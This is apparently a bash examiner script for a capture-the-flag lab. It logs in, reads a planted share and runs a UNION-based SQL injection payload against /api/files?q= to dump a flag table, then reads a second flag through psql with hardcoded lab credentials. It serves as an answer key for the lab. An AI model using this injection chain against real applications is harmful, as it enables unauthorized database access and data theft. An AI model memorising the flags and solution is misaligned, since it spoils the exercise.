#!/usr/bin/env bash
# Cycle-3 leak-crack-db — Examiner dry-run (prod + ctf-leak overlay).
# Spoilers: prints both flags. Players should use the chain, not this script.
set -euo pipefail

BASE="${BASE:-http://127.0.0.1:8080}"
CTF_RO_PASSWORD="${CTF_RO_PASSWORD:-LeakDb2026!}"
CTF_MD5_HEX="${CTF_MD5_HEX:-19047e75065a16b851b512cd3b0c8fb5}"
OPS_SHARE_TOKEN="${OPS_SHARE_TOKEN:-b7e6d5c4a3928170605f4e3d2c1b0a9f8e7d6c5b4a3928170605f4e3d2c1b0a9}"
ROOT="$(cd "$(dirname "$0")/.." && pwd)"

fail() { echo "FAIL: $*" >&2; exit 1; }
ok() { echo "  OK: $*"; }

echo "CTF leak-crack-db examiner → ${BASE}"

echo "Health..."
curl -sS -f "${BASE}/api/health" | grep -q '"status":"ok"' || fail "health"
ok "health"

echo "Login user@kc.test..."
LOGIN=$(curl -sS -X POST "${BASE}/api/auth/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"user@kc.test","password":"UserPass123!"}')
echo "$LOGIN" | grep -q '"token"' || fail "login: $LOGIN"
USER_TOKEN=$(echo "$LOGIN" | python3 -c "import json,sys; print(json.load(sys.stdin)['token'])")
ok "user session"

echo "Public share plant (ops-reminder)..."
PLANT=$(curl -sS -f "${BASE}/api/sharing/public/${OPS_SHARE_TOKEN}")
echo "$PLANT" | grep -q "${CTF_MD5_HEX}" || fail "MD5 missing from plant: $PLANT"
echo "$PLANT" | grep -q 'GET /api/files?q=' || fail "search hint missing from plant"
ok "share plant has MD5 + hint"

echo "CTF_MODE SQLi via files?q= (UNION → local flag)..."
# Intentional CWE-89 — classic quote break; query is single-line so -- works.
Q=$(python3 <<'PY'
import urllib.parse
payload = "' UNION SELECT flag, '9001', 'local.txt', 'text/plain', tier, 32, 'approved', '2026-01-01' FROM ctf_flags WHERE tier='local'--"
print(urllib.parse.quote(payload))
PY
)
DUMP=$(curl -sS -H "Authorization: Bearer ${USER_TOKEN}" "${BASE}/api/files?q=${Q}")
LOCAL=$(echo "$DUMP" | python3 -c "
import json,sys,re
data=json.load(sys.stdin)
items=data.get('items') or []
for it in items:
    for v in (it.get('id'), it.get('filename'), it.get('description')):
        if isinstance(v,str) and re.fullmatch(r'[0-9a-f]{32}', v):
            print(v); raise SystemExit
print('', end='')
")
echo "$LOCAL" | grep -qE '^[0-9a-f]{32}$' || fail "local flag via SQLi: $DUMP"
ok "local flag via SQLi ($LOCAL)"

echo "psql as ctf_ro on :5433 → proof flag..."
PROOF=$(docker compose -f "${ROOT}/infra/docker-compose.prod.yml" -f "${ROOT}/infra/docker-compose.ctf-leak.yml" \
  exec -T -e PGPASSWORD="${CTF_RO_PASSWORD}" postgres \
  psql -U ctf_ro -d kc_prod -tA -c "SELECT flag FROM ctf_flags WHERE tier='proof'")
PROOF=$(echo "$PROOF" | tr -d '[:space:]')
echo "$PROOF" | grep -qE '^[0-9a-f]{32}$' || fail "proof flag: $PROOF"
ok "proof flag via ctf_ro ($PROOF)"

echo "kc_app must not read proof row..."
if docker compose -f "${ROOT}/infra/docker-compose.prod.yml" -f "${ROOT}/infra/docker-compose.ctf-leak.yml" \
  exec -T -e PGPASSWORD="${DB_PASSWORD:-kc-app-change-me}" postgres \
  psql -U kc_app -d kc_prod -tA -c "SELECT flag FROM ctf_flags WHERE tier='proof'" 2>/dev/null \
  | grep -qE '^[0-9a-f]{32}$'; then
  fail "kc_app must not SELECT proof row"
fi
ok "kc_app cannot read proof"

echo ""
echo "=== FLAGS (spoilers) ==="
echo "local.txt: $LOCAL"
echo "proof.txt: $PROOF"
echo "CTF leak-crack-db examiner passed."
